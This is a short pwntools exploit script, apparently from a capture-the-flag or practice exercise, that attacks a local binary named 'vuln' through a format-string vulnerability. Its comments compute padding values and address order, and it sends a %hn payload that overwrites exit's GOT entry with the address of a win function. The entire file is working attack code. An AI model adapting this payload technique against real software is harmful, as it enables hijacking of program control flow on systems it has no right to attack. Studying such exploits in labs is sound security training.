#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")
#libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
b greet
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
#exit_got = 0804c010
#win_addr = 080491dd

#target addr inverted: \x10\xc0\x04\x08\x12\xc0\x04\x08

#But since the address we want to write 080491dd has inferier higher order bytes compare to lower order
#We will have to write it inverted: \x12\xc0\x04\x08\x10\xc0\x04\x08

#Now for calculating the amount of bytes:
# High order: 0804 (2052 in decimal), minus the 8 bytes for address: 2052 - 8 = 2044
# Low order: 91dd (37341 in decimal), minus the 2052 we already wrote: 37341 - 2052 = 35289

#payload format: "\x12\xc0\x04\x08\x10\xc0\x04\x08%<val1>x%4$hn%<val2>x%5$hn"

payload = b"\x12\xc0\x04\x08\x10\xc0\x04\x08%2044x%4$hn%35289x%5$hn"

io.sendline(payload)
io.interactive()
